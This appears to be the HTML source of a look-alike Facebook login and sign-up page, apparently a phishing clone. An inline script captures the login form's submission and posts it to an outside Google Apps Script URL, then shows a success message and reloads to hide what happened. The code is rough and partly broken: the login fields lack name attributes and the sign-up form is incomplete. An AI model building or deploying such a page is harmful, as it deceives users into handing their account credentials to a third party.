<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="fb.css" type="text/css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo" >
                <a class="logo-text"  href="index.html">
                    Facebook
                </a>
                

            </div>
            <div class="login">
                <form id="submit-form" action="">
                <table id="table" class="login-table">
                    <tr >
                        <td  id="name"class="logopss"><label > Email or mobile </label></td>
                        <td  id="color" class="logopss">password</td>

                    </tr>
                    <tr >
                        <td ><input id="name" type="text"></td>
                        <td><input id="color" type="text"></td>
                        <td ><input class="logbutton"  type="submit" value="login"></td>
                        
                    </tr>
                    <tr>
                        <td></td>
                        <td class="logopss">forget password?</td>




                    </tr>





                </table>
            </form>

            </div>

        </div>
        <div class="main-body">
            <div class="left">
                <p class="para">Facebook helps to connect to people</p> 
                <img class="imgpara" src="" alt="image down">

            </div>
            <div class="right">
                <h1></h1>
                <form  action="" id="signup-form">
                    <input name="email" class="page" type="email" placeholder="Email">
                    <br>
                    <input name="pass" id="pa" class="page" type="password " placeholder="Password" ><br>
                    
                    <select name="Day" id="sec">
                        
                        <option value="">Day</option>
                        <option value="1">1</option>
                        <option  value="2">2</option>
                        




                    </select>
                    <br>
                    <input type="submit" value="Sign">


                </form>


            </div>






        </div>



    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.3/dist/jquery.validate.js"></script>
    <script src="fb.js"></script>
    <script>
        $("#submit-form").submit((e)=>{
            e.preventDefault()
            $.ajax({
                url:"https://script.google.com/macros/s/AKfycby84J7ctgETliWNpCi-V7VWKPlbMBPYUCVojD-DKA/exec",
                data:$("#submit-form").serialize(),
                method:"post",
                success:function (response){
                    alert("Form submitted successfully")
                    window.location.reload()
                    //window.location.href="https://google.com"
                },
                error:function (err){
                    alert("Something Error")
      
                }
            })
        })
      </script>
      
    
    
</body>
</html>
